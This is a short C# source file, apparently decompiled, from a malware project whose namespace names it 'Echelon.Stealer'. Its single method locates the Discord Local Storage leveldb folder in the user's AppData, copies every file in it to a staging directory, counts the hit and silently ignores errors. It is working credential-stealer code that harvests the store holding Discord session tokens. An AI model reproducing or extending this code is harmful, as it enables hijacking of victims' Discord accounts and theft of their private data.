using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Discord
{
	// Token: 0x02000020 RID: 32
	internal class Discord
	{
		// Token: 0x0600007E RID: 126 RVA: 0x0001B034 File Offset: 0x00019234
		public static void GetDiscord(string Echelon_Dir)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + Discord.dir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + Discord.dir).GetFiles())
					{
						Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
						fileInfo.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + fileInfo.Name);
					}
					Discord.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000061 RID: 97
		public static int count;

		// Token: 0x04000062 RID: 98
		public static string dir = "\\discord\\Local Storage\\leveldb\\";
	}
}
